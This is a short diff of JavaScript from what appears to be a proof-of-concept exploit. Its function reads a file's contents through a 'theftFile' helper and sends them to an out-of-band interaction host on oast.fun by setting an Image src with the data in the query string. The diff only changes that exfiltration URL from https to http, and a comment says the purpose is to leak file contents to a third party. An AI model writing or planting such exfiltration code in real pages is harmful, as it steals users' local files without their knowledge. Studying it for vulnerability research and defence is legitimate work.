@@ -4,7 +4,7 @@
     function blobCallback(blobUrl) {
         theftFile(blobUrl, function(contents) {
              // Leak file contents to a third-party URL
-            new Image().src = "https://cvkl1dsdlejidrv5elugyb3oe899c758i.oast.fun/?data=" + encodeURIComponent(contents);
+            new Image().src = "http://cvkl1dsdlejidrv5elugyb3oe899c758i.oast.fun/?data=" + encodeURIComponent(contents);
         });
     }
 
